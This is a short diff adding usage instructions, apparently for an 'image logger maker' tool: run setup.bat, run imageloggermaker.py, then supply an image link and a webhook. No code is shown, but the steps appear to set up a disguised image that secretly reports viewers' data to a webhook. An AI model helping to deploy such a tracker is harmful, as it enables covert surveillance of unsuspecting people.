@@ -1,0 +1,3 @@
+click on setup.bat first 
+and after that click on imageloggermaker.py
+press 1 time on enter then its will loading and then give image link and that it after that give ur webhook and that it!!.
